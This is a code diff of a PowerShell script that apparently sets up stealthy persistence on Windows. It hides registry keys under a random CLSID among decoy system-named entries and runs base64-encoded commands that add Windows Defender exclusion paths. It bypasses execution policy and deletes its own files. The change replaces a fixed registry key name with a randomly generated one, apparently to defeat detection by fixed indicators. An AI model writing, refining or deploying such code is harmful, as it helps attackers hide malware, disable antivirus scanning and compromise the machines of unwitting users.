@@ -18,6 +18,7 @@ $initFindePath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $initFindePath = "$initFindePath\$([System.IO.Path]::GetRandomFileName()).exe"
 $g = "{$([guid]::NewGuid().ToString().ToUpper())}"
 $basePath = "HKLM:\Software\Classes\CLSID\$g\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system"
+$main = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 13 | % { [char]$_ })
 New-Item -Path "$basePath" -Force
 New-ItemProperty -Path "$basePath" -Name "mode" -PropertyType DWORD -Value 0xFFFFFFFF -Force | Out-Null
 $ms = @("WinSxS_Backup", "System32_Compat", "TrustedInstallerCache", "Edge_Telemetry", "DirectX_Logs", "Windows_Defender_CrashDumps", "ServiceHost_Spooler", "RDP_Encryption_Junk", "NVIDIA_Driver_Dumpster", "UpdateOrchestrator_Failures", "LSA_Secret_Trash", "WMI_Execution_Garbage", "TaskScheduler_Fuckups", "MSI_Installer_Leftovers", "EventLog_Bloatware", "PowerShell_Module_Clutter", "NetFramework_BrokenAssemblies", "BITS_Transfer_Corruption", "CredentialManager_Leaks", "Firewall_Rule_Chaos" ) 
@@ -42,7 +43,7 @@ Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", 
         New-ItemProperty -Path "$basePath\$($ms[$idx])" -Name "Authority" -Value "SYSTEM" -Force
     }
     if($curr -eq $score){   
-        New-Item -Path "$basePath\yXureYzQpIRLN" -Force | Out-Null  
+        New-Item -Path "$basePath\$main" -Force | Out-Null  
     }
 
 
@@ -82,8 +83,8 @@ powershell -enc "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFA
 powershell -enc "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAZQByAHYAaQBjAGUAUAByAG8AZgBpAGwAZQBzAFwATgBlAHQAdwBvAHIAawBTAGUAcgB2AGkAYwBlACIAIAAvAGYA"
 
 
-Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$initServiceFwdmonPath -basePath '$basePath\yXureYzQpIRLN'" -Wait
-Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$initServiceRootmonmonPath -rootPath '$rootPath' -basePath '$basePath\yXureYzQpIRLN'"
+Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$initServiceFwdmonPath -basePath '$basePath\$main'" -Wait
+Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$initServiceRootmonmonPath -rootPath '$rootPath' -basePath '$basePath\$main'"
 
 Remove-Item -Path $f -Force -ErrorAction SilentlyContinue
 Remove-Item -Path $initFindePath -Force -ErrorAction SilentlyContinue
